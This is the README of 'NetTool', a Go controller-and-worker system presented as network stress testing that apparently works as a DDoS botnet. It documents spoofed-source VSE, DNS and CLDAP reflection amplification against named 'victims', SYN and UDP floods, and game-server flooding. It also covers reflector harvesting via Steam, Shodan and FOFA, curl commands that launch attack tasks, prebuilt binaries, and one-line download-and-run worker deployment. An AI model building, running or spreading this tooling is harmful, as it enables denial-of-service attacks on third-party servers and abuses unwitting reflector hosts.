# NetTool - Distributed Network Stress Testing

## Architecture

```mermaid
flowchart LR
    D["Dashboard: Browser UI"] -->|"WS stats tasks"| C["Controller: HTTP 8080 gRPC 9090"]
    C -->|"gRPC Task"| W1["Worker 1"]
    C -->|"gRPC Task"| W2["Worker 2"]
    C -->|"gRPC Task"| WN["Worker N"]
    W1 -->|"Stats Stream 500ms"| C
    W2 -->|"Stats Stream 500ms"| C
    WN -->|"Stats Stream 500ms"| C
```

- **Controller**: gRPC server + REST API + WebSocket + Web UI  
- **Worker**: gRPC client, registers with Controller, executes attacks  
- **Dashboard**: Alpine.js SPA, real-time stats via WebSocket, EN/ZH language toggle  

---

## Quick Start

> **Linux is recommended** for full features (IP spoofing, raw sockets, higher performance).  
> Windows works for all attack methods but lacks IP spoofing.

### 1. Build

```bash
# Linux (primary target)
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o dist/controller-linux-amd64 ./cmd/controller/
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o dist/worker-linux-amd64    ./cmd/worker/

# Windows (limited: no IP spoofing)
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o dist/controller-windows-amd64.exe ./cmd/controller/
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o dist/worker-windows-amd64.exe    ./cmd/worker/
```

`-ldflags="-s -w"` strips debug symbols to reduce size (controller ~17MB, worker ~12MB).
Pre-built binaries for all four platforms are included in the `dist/` directory.

### 2. Start Controller

```bash
./controller -grpc :9090 -http :8080
```

First run prompts for Steam API key (optional, enables auto-refresh of game server pools):

```
Steam Web API Key not found.
Get one at: https://steamcommunity.com/dev/apikey
Enter your key (or press Enter to skip):
```

Output:
```
Admin Token:  a1b2c3d4e5f6...  ← use this to login to dashboard
Worker Token: 7890abcdef12...  ← give this to worker nodes
```

Open `http://<controller-ip>:8080`, login with **Admin Token**.
`/pool` — manage reflector pools (Steam auto-import + manual add).

### 3. Start Workers

```bash
# Minimal startup (recommended)
./worker -c <controller-ip>:9090 -token <worker-token>

# With L7 proxy support
./worker -c <controller-ip>:9090 -token <worker-token> -proxy

# Non-root servers: run in background (no nohup needed, log: data/worker.log)
./worker -c <controller-ip>:9090 -token <worker-token> -daemon

# Install as system service (auto-start)
sudo ./worker -c <controller-ip>:9090 -token <worker-token> -install
```

**Worker auto-detects:**
- WAN IP and generates ID (e.g., `1-2-3-4-node1`)
- Geographic location via `api.ip.cc` (e.g., CN, US, SG)
- Enables local reflector pool automatically
- Pulls Steam VSE pool and tests concurrently (200 goroutines)

**Available flags:**
- `-c` — Controller address (required)
- `-token` — Worker auth token (required)
- `-proxy` — Fetch L7 proxies from controller (optional)
- `-install` — Install as systemd/Windows service (optional)
- `-daemon` — Run in background without nohup (optional, for non-root users; log `data/worker.log`, pid `data/worker.pid`)

**Default behavior:**
- Bandwidth: unlimited, auto-throttled when controller disconnects
- Local reflector pool: enabled by default
- Geographic optimization: DNS reflectors prioritize same country
- Periodic retest: every 3 hours, removes failed nodes after 3 consecutive failures

---

## Worker Protection Mechanisms

The worker includes self-protection to prevent control-channel collapse under heavy traffic:

| Mechanism | Trigger | Behavior |
|-----------|---------|----------|
| **Heartbeat Circuit Breaker** | Consecutive gRPC heartbeat failures | 1→monitor, 2→halve bandwidth, 3→1Mbps, 4+→0.1Mbps. Auto-restores on recovery |
| **Adaptive Stats Reporting** | Heartbeat latency > 1s | Reporting interval rises from 500ms → 1s → 2s. Auto-resets every 3s |
| **Global Bandwidth Limit** | Auto-throttled when controller disconnects | Reserves bandwidth for reconnection while maintaining attacks via local reflector pool |
| **gRPC Keepalive** | Always on | 10s ping / 5s timeout. Disconnect detected <10s |
| **System Load Reporting** | Every 3s heartbeat | CPU% + Memory MB sent to Controller, visible on dashboard node list |
| **Auto Thread Tuning** | Every 15s | CPU >80% → scale to 70% bandwidth; CPU <40% → scale to 130%. Suspended while circuit breaker is degraded |
| **Reflector Cache** | On attack start | Caches reflector list locally; checks `/api/reflectors/version` before re-fetching |
| **Local Reflector Pool** | Auto-enabled on startup | Workers maintain local SQLite database with tested reflectors. Quality scoring: success rate 40% + latency 30% + amplification 20% + stability 10% |
| **Hot Pool Replacement** | During attacks | Monitors reflector failures in real-time. Replaces failed nodes (10+ failures) from backup pool every 30s |
| **Geographic Optimization** | Auto-detected location | DNS reflectors prioritize same country. VSE uses global pool. Reduces latency from 200-800ms to 20-150ms |

---

## Attack Methods

### Combo Attack (New)
Simultaneously execute multiple attack methods against a single target. All sub-attacks share the same target and duration, fire at once, and aggregate stats.

```
Target: ark-server:27015
Duration: 60s
Sub-attacks:
  ├── vse_reflector    threads=200  packet_size=1400
  ├── dns_reflector    threads=200  packet_size=512
  └── tcp_syn_spoof    threads=500  packet_size=1200
```

### VSE Amplification
```
Target: game-server:27015
Request: 25 bytes (A2S_INFO query)
Response: 200-4000 bytes → 10x-160x amplification
```

### VSE Reflector Amplification (Linux only — IP spoofing)
```
Worker → [spoofed src=victim] → Reflector → [259B response] → Victim
Requires: Linux + root, reflector pool pre-loaded
```

### DNS Reflector Amplification (Linux only — IP spoofing)
```
Worker → [spoofed src=victim] → DNS Resolver → [large response] → Victim
Requires: Linux + root, DNS resolver pool pre-loaded
```

### CLDAP Reflector Amplification (Linux only — IP spoofing)
```
Worker → [spoofed src=victim] → CLDAP Server → [39B query → 1000-6000+B response] → Victim
Amplification: 25x-150x
Requires: Linux + root, CLDAP server pool pre-loaded
```

### Layer 4
| Method | Type | Description |
|--------|------|-------------|
| `udp_stdhex` | UDP | 0xDEADBEEF header + random padding |
| `udp_plain` | UDP | All 'A' characters |
| `udp_bypass` | UDP | 10 random payload pool rotation |
| `udp_burst` | UDP | 5x burst send, 100ms interval |
| `tcp_syn` | TCP | Half-open connection flood |
| `tcp_syn_spoof` | TCP | SYN flood with random spoofed source IPs (Linux only, raw socket, per-thread fd reuse) |
| `tcp_ack` | TCP | Connect + 50 ACK payloads per connection |
| `tcp_connect` | TCP | Full connect + immediate close |
| `tcp_tcpbypass` | TCP | TCP bypass flood with payload rotation |
| `cldap_reflector` | UDP Amp | CLDAP reflection amplification (39B query, 25x-150x amp, Linux only) |

### Layer 7
| Method | Description |
|--------|-------------|
| `http_flood` | Rapid HTTP GET requests |
| `https_bypass` | HTTPS GET (TLS skip-verify + proxy rotation) |

### Game-Specific
| Game | Default Port | Primary Attack |
|------|-------------|----------------|
| CS:GO / Apex | 27015 | VSE Amplification |
| Rust | 28015 | VSE Amplification |
| Minecraft | 25565 | TCP Handshake / Login |
| PUBG / ARK / Fortnite | 27015 | Game UDP Spam (prefixed packets) |

---

## Web Dashboard

### Login
Enter the **Admin Token** printed at Controller startup.

### New Attack
1. Select method (or **Combo Attack** for multi-method)
2. Enter target (`IP:port` or URL)
3. For combo: add sub-attacks, each with custom threads/packet_size/rate limits
4. Set duration / threads / packet size
5. Click **Start Attack**

All connected workers receive the task and execute simultaneously. A new task starts as
`pending`; the Controller dispatches it to each worker on its heartbeat, then flips the task
to `running` once every online worker has claimed it. If a not-yet-assigned worker drops out
during dispatch, offline detection (5s) re-evaluates and flips it, so tasks never stall in `pending`.

### Language Toggle
Click **[EN]** / **[中文]** in the header to switch between English and Chinese. Preference saved to localStorage.

### VSE Scanner
Scans for Source Engine (A2S_INFO) game servers. Supports:
- **Single IP**: enter same IP in Start and End fields
- **Range scan**: enter different Start/End IPs

Results show server name, game, map, player count, VAC status, and response size.  
Click **Attack** next to any result to auto-fill target with VSE method.

### Proxy Manager
Online editor for the global proxy file. Format:
```
# HTTP proxy
192.168.1.1:8080
http://user:pass@proxy.example.com:3128

# SOCKS5 proxy
socks5://user:pass@socks.example.com:1080
```
Click **Save** to persist. Workers with `--proxy controller` auto-fetch.

### Worker Command
Dashboard shows ready-to-copy worker command string.

### Quick Deploy (快速上线)
Set a **cloud storage URL** (direct link to the worker binary), pick optional flags
(`-proxy` fetch L7 proxies / `-install` auto-start service / `-daemon` background run),
and the dashboard concatenates the controller address + worker token into a one-line
download-and-run command. `-install` and `-daemon` are mutually exclusive.
Config persists in `data/deploy_storage_url.txt`.

### Reflector Pool Manager (`/pool`)
Separate page for managing game-specific reflector pools. Each game tab (ARK / CS2 / Rust / Other) contains:
- **Steam entries**: auto-refreshed every 6h via Steam Web API (if `data/steam_api.key` exists)
- **Manual entries**: paste `IP:Port` lists (FOFA/Shodan exports), auto-scanned on add
- **Test & Clean**: validates manual entries via UDP, removes dead servers
- Add entries to the **Other** pool for auto-classification by game type

---

## CLI Mode

```bash
# Create combo attack task
curl -X POST http://localhost:8080/api/tasks \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"target":"1.2.3.4:27015","method":"combo","duration":60,
       "sub_attacks":[
         {"method":"vse_reflector","threads":200,"packet_size":1400},
         {"method":"dns_reflector","threads":200,"packet_size":512},
         {"method":"tcp_syn_spoof","threads":500,"packet_size":1200}
       ]}'

# Create single attack task
curl -X POST http://localhost:8080/api/tasks \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"target":"1.2.3.4:27015","method":"vse","duration":60,"threads":20}'

# Create TCP SYN spoof attack (Linux only)
curl -X POST http://localhost:8080/api/tasks \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"target":"1.2.3.4:27015","method":"tcp_syn_spoof","duration":60,"threads":200}'

# Scan single IP
curl -X POST http://localhost:8080/api/scan \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"ip":"202.189.4.160","port":27015}'

# Scan IP range
curl -X POST http://localhost:8080/api/scan \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"start_ip":"192.168.1.1","end_ip":"192.168.1.254","port":27015,"concurrency":50}'

# List pools
curl http://localhost:8080/api/pools -H "Authorization: Bearer <admin-token>"

# Force Steam refresh for a game
curl -X POST http://localhost:8080/api/pools/ark/refresh \
  -H "Authorization: Bearer <admin-token>"

# Add manual entries (auto-scanned)
curl -X POST http://localhost:8080/api/pools/other/add \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '["1.2.3.4:27015","5.6.7.8:27016"]'

# Check reflector pool version (for cache)
curl http://localhost:8080/api/reflectors/version \
  -H "Authorization: Bearer <admin-token>"
```

---

## File Structure

```
ds/
├── cmd/
│   ├── controller/main.go    # Controller entry point
│   └── worker/main.go        # Worker entry point
├── internal/
│   ├── attack/
│   │   ├── attack.go         # Attack engine (VSE, L4, L7, game-specific)
│   │   ├── combo.go          # ComboSession: multi-method simultaneous attack
│   │   ├── tcp_syn_spoof.go  # TCP SYN with random spoofed source IP
│   │   ├── spoof_linux.go    # IP spoofing raw sockets (UDP/TCP, Linux only)
│   │   ├── spoof_other.go    # IP spoofing stub (Windows)
│   │   ├── sendmmsg_linux.go # Linux sendmmsg syscall batch UDP
│   │   ├── sendmmsg_other.go # Non-Linux fallback batch send
│   │   ├── udp_raw_linux.go  # UDP raw socket fd extraction
│   │   ├── socks5udp.go      # SOCKS5 UDP relay for proxied scans
│   │   ├── steam.go          # Steam Web API server discovery
│   │   ├── proxy.go          # HTTP/HTTPS/SOCKS5 proxy management
│   │   ├── hot_pool.go       # Hot reflector pool (real-time replacement)
│   │   └── ratelimiter_test.go # Rate limiter unit tests
│   ├── controller/
│   │   ├── controller.go     # gRPC + REST + WebSocket server
│   │   ├── shodan.go         # Shodan API DNS discovery integration
│   │   ├── spoof_probe.go    # UDP spoof probe listener
│   │   └── tls.go            # Optional TLS certificate loading
│   ├── worker/
│   │   ├── worker.go         # gRPC client + task runner + auto-start
│   │   ├── bandwidth.go      # Linux NIC bandwidth auto-detection
│   │   ├── local_pool.go     # Worker-local SQLite reflector cache
│   │   ├── location.go       # Geolocation via api.ip.cc
│   │   ├── spoof_probe.go    # Worker-side spoofing capability probe
│   │   ├── sysinfo_linux.go  # Linux CPU/Memory usage collection
│   │   └── sysinfo_windows.go# Windows CPU/Memory usage collection
│   ├── reflector/
│   │   └── pool.go           # Game-specific reflector pool manager
│   └── proto/
│       ├── attack.proto      # Protobuf service definition
│       ├── attack.pb.go
│       └── attack_grpc.pb.go
├── web/
│   ├── embed.go              # Go embed for static files
│   └── static/
│       ├── index.html        # Alpine.js dashboard SPA (EN/ZH i18n)
│       └── pool.html         # Reflector pool manager (EN/ZH i18n)
├── data/                     # Runtime files (auto-created)
│   ├── auth/
│   │   ├── admin.token
│   │   └── worker.token
│   ├── steam_api.key         # Steam Web API key (optional)
│   ├── shodan_config.json    # Shodan API config
│   ├── reflectors.db         # SQLite reflector pools
│   ├── dns_amp_domain.txt    # Custom DNS amplification domain
│   ├── dns_amp_domains.txt   # DNS amplification domain list
│   └── proxies.txt           # Global proxy list
├── dist/                     # Pre-built binaries (-ldflags="-s -w")
│   ├── controller-windows-amd64.exe
│   ├── worker-windows-amd64.exe
│   ├── controller-linux-amd64
│   ├── worker-linux-amd64
│   └── data/                 # Bundled runtime data
├── vse_amp_test.py           # VSE reflector amplification tester
├── dns_amp_test.py           # DNS amplification ratio tester
├── cldap_amp_test.py         # CLDAP reflector testing tool
├── go.mod
├── go.sum
├── README.md
└── README_CN.md
```

---

## OS Support

> Linux is the primary platform. All features available including IP spoofing (requires root).

| Feature | Linux | Windows |
|---------|-------|---------|
| IP Spoofing (UDP + TCP SYN) | ✓ (root) | ✗ |
| VSE Attack | ✓ | ✓ |
| L4 UDP/TCP | ✓ | ✓ |
| L7 HTTP/HTTPS | ✓ | ✓ |
| Proxy (SOCKS5) | ✓ | ✓ |
| Bandwidth Auto-Detect | ✓ | ✗ |
| System Load Report | ✓ | ✓ |
| Auto-Start | systemd | schtasks |

---

## API Reference

| Endpoint | Method | Auth | Description |
|----------|--------|------|-------------|
| `/api/auth` | POST | No | Login with token, returns role |
| `/api/nodes` | GET | Bearer | List connected worker nodes (with CPU/Memory) |
| `/api/tasks` | GET | Bearer | List all tasks |
| `/api/tasks` | POST | Bearer | Create attack task (supports `sub_attacks` for combo) |
| `/api/tasks/:id/stop` | POST | Bearer | Stop running task |
| `/api/stats` | GET | Bearer | Aggregated live stats (PPS, BPS, packets) |
| `/api/scan` | POST | Bearer | VSE/DNS server scan (single IP or range) |
| `/api/proxy` | GET | Bearer | Get global proxy file contents |
| `/api/proxy` | PUT | Bearer | Update global proxy file |
| `/api/pools` | GET | Bearer | List game pools with counts |
| `/api/pools/{game}` | GET | Bearer | List pool entries |
| `/api/pools/{game}/add` | POST | Bearer | Add manual entries (auto-scan) |
| `/api/pools/{game}/refresh` | POST | Bearer | Refresh from Steam API |
| `/api/pools/{game}/test` | POST | Bearer | Test manual entries, cleanup dead |
| `/api/reflectors/all` | GET | Bearer | Combined targets for attacks |
| `/api/reflectors/version` | GET | Bearer | Pool version hash + count (for worker cache) |
| `/api/templates` | GET/POST/DELETE | Bearer | Attack template CRUD |
| `/api/deploy/config` | GET/PUT | Bearer | Quick-deploy cloud storage URL |
| `/api/deploy/command` | GET | Bearer | Assemble deploy command (`addr`, `proxy=1`, `install=1`, `daemon=1`) |
| `/api/logs` | GET | Bearer | Attack log history |
| `/api/logs/export` | GET | Bearer | CSV export |
| `/ws` | WS | query | Real-time dashboard push stream |

---

<details>
<summary><b>Code Flowcharts</b> (click to expand)</summary>

### 1. Controller Startup

```mermaid
flowchart TD
    A["main.go: flag.Parse()"] --> B["ensureSteamKey()"]
    B --> C["controller.New()"]
    C --> D["loadOrGenerate: admin.token"]
    C --> E["loadOrGenerate: worker.token"]
    C --> F["os.ReadFile: proxies.txt"]
    C --> G["reflector.InitAllPools()"]
    D --> H["ctrl.Start()"]
    E --> H
    F --> H
    G --> H
    H --> I["grpc.NewServer()"]
    I --> J["srv.Serve(:9090)"]
    H --> K["watchOfflineNodes: 5s ticker"]
    H --> L["cronSteamRefresh: every 6h"]
    H --> M["cronManualTest: every 1h"]
    H --> N["http.NewServeMux()"]
    N --> O["ListenAndServe(:8080)"]
```

### 2. Worker Lifecycle

```mermaid
flowchart TD
    A["main.go: flag.Parse()"] --> B["GetWANIP()"]
    B --> C["Generate ID"]
    C --> D["worker.New()"]
    D --> E["worker.Connect()"]
    E --> F["worker.Run()"]
    F --> G["check root/admin + detect bandwidth"]
    G --> H["fetchProxy()"]
    H --> I["register() RPC"]
    I -->|"ID conflict"| J["Controller assigns new ID"]
    I --> K["Heartbeat Loop: every 3s"]
    K --> K1["collectSystemStats (CPU/Memory)"]
    K1 --> L["Heartbeat RPC (with CPU/Mem)"]
    L -->|"PendingTask"| M["startTask()"]
    L -->|"CancelTaskId"| N["stopTask()"]
    L -->|"connection error"| O["circuit breaker: degrade/survival"]
    M --> P["streamStats: adaptive 500ms-2s"]
    K --> Q["autoTuneThreads: every 15s"]
```

### 3. Combo Attack Lifecycle

```mermaid
sequenceDiagram
    participant UI as Dashboard
    participant C as Controller
    participant W as Worker
    participant CS as ComboSession
    participant A1 as SubAttack 1
    participant A2 as SubAttack 2
    participant A3 as SubAttack 3

    UI->>C: POST /api/tasks (method=combo, sub_attacks=[...])
    C->>C: validate + create TaskInfo
    C-->>UI: task JSON + WS broadcast
    W->>C: Heartbeat (every 3s)
    C-->>W: HeartbeatResp(task + sub_attacks)
    W->>W: fetchReflectorCache (5min TTL + version check)
    W->>CS: StartComboAttack(cfg, subCfgs)
    CS->>A1: StartVSEAmplificationEx()
    CS->>A2: StartDNSAmplificationEx()
    CS->>A3: StartSpoofedTCPFloodEx()
    loop Aggregate Stats
        CS->>CS: trackComboRates (sum PPS/BPS)
    end
    W->>C: ReportStats (combo aggregated)
    C-->>UI: WS update
```

### 4. Attack Task Lifecycle

```mermaid
sequenceDiagram
    participant UI as Dashboard
    participant C as Controller
    participant W as Worker
    participant ATK as Attack Engine

    UI->>C: POST /api/tasks
    C->>C: validate + check workers
    C->>C: create TaskInfo(pending)
    C-->>UI: task JSON + WS broadcast
    W->>C: Heartbeat (every 3s)
    C->>C: find pending task
    C->>C: dispatch to unclaimed worker
    C->>C: all online workers claimed? → flip running
    C-->>W: HeartbeatResp(task)
    C-->>UI: WS update
    W->>ATK: start attack
    ATK-->>W: AttackSession
    loop Adaptive 500ms-2s
        W->>C: ReportStats
    end
    ATK->>ATK: duration expires
    W->>C: ReportStats(finished)
    C-->>UI: WS update (completed)
    Note over UI,ATK: Manual stop:
    UI->>C: POST /api/tasks/stop
    W->>C: Heartbeat
    C-->>W: HeartbeatResp(cancel)
    W->>ATK: session.Stop()
```

### 5. Worker Protection: Circuit Breaker

```mermaid
flowchart TD
    A["Heartbeat RPC"] --> B{failed?}
    B -->|no| C["failStreak = 0, reset limit"]
    B -->|yes| D["increment failStreak"]
    D --> E{failStreak?}
    E -->|1| F["Monitor — no action"]
    E -->|2| G["Bandwidth → 50%"]
    E -->|3| H["Bandwidth → 1 Mbps (survival)"]
    E -->|4+| I["Bandwidth → 0.1 Mbps"]
    G --> J["Recovery ticker: 10s"]
    H --> J
    I --> J
    J --> K{"3+ fails & 10s elapsed?"}
    K -->|yes| L["Emergency: stop ALL attacks"]
    K -->|no| J
```

### 6. VSE Scanner

```mermaid
flowchart TD
    A["UI: startScan()"] --> B{"single IP or range?"}
    B -->|single| C["POST /api/scan ip port"]
    B -->|range| D["POST /api/scan start end port"]
    C --> E["handleScan()"]
    D --> E
    E --> F{"ip field set?"}
    F -->|yes| G["ScanIP() 3s timeout"]
    F -->|no| H["ScanRange() semaphore"]
    G --> I["ResolveUDPAddr"]
    H --> G
    I --> J["ListenUDP + WriteToUDP"]
    J --> K["ReadFromUDP 3s"]
    K -->|"0x49 INFO"| L["parseServerInfo()"]
    K -->|"0x41 CHALLENGE"| M["send challenge + read"]
    M --> L
    L --> N["return ScanResult to UI"]
```

### 7. gRPC Protocol

```mermaid
flowchart LR
    subgraph Controller
        NS["NodeService Server"]
    end
    subgraph Worker
        NC["NodeService Client"]
    end
    NC -->|"1. Register (CPU/Memory info)"| NS
    NS -->|"assigned_id"| NC
    NC -->|"2. Heartbeat 3s (CPU% + Memory)"| NS
    NS -->|"PendingTask / CancelTaskId"| NC
    NC -->|"3. ReportStats stream adaptive"| NS
    NS -->|"StatsAck"| NC
    NC -->|"4. Deregister"| NS
```

### 8. WebSocket Broadcast

```mermaid
sequenceDiagram
    participant UI as Dashboard
    participant C as Controller
    participant MEM as wsClients

    UI->>C: GET /ws
    C->>C: upgrade
    C-->>UI: nodes data
    loop keep-alive
        UI-->>C: ReadMessage
    end
    Note over C: node or task change:
    C->>MEM: iterate clients
    MEM-->>UI: broadcast JSON
```

### 9. Offline Node Detection

```mermaid
flowchart TD
    A["watchOfflineNodes: 5s ticker"] --> B["for each node"]
    B --> C{"last heartbeat > 15s?"}
    C -->|yes| D["status = OFFLINE"]
    C -->|no| E["skip"]
    D --> R{"any node went offline?"}
    R -->|yes| S["re-evaluate pending tasks"]
    S --> T{"all online workers claimed?"}
    T -->|yes| U["flip running (self-heal)"]
    T -->|no| F["WS broadcast nodes"]
    U --> F
    R -->|no| F
    E --> F
    F --> B
    G["Worker Heartbeat 3s"] --> H["update timestamp"]
```

</details>
